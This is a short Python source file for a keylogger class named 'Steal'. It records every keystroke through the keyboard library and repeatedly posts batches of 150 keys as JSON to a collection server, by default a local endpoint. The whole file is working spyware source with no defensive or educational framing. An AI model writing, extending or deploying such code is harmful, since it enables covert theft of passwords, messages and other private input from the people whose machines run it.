import keyboard as kb
import requests

class Steal:
    
    def __init__(self,server="http://127.0.0.1:5000/getin/it/data"):
        self.server=server
        self.data=[]
        self.limit=150
        
    def get_key(self):
        return kb.read_key()
    
    def send(self):
        requests.post(self.server,json={"data":self.data})
    
    def run(self):
        while True:
            if len(self.data) >= self.limit:
                self.send()
                self.data.clear()
                
            self.data.append(self.get_key())
            
            

app = Steal()
app.run()